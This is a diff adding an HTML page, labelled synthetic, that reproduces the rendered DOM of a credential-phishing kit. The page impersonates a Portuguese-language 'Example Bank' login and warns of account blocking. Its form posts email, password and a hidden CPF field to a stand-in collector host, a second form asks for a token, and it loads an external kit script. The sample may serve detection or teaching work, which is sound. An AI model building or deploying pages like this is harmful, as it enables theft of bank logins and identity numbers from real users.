@@ -1,0 +1,17 @@
+<!-- provenance: synthetic (documentation values); rendered DOM of a credential-phishing kit page -->
+<!doctype html>
+<html lang="pt-BR"><head><meta charset="utf-8"><title>Entrar - Example Bank</title>
+<link rel="icon" href="/favicon.ico"></head>
+<body>
+<img src="https://cdn.example.net/logo-examplebank.png" alt="Example Bank">
+<p>Ola user@example.com, confirme seu acesso para evitar o bloqueio da conta.</p>
+<form id="login" action="https://collector.example.org/gate.php" method="POST">
+  <input type="email" name="email" value="user@example.com">
+  <input type="password" name="senha">
+  <input type="hidden" name="cpf" value="">
+  <button type="submit">Entrar</button>
+</form>
+<form action="/secure/next.php"><input type="text" name="token"></form>
+<script src="https://cdn.example.net/kit.js"></script>
+<iframe src="https://www.example.org/embed"></iframe>
+</body></html>
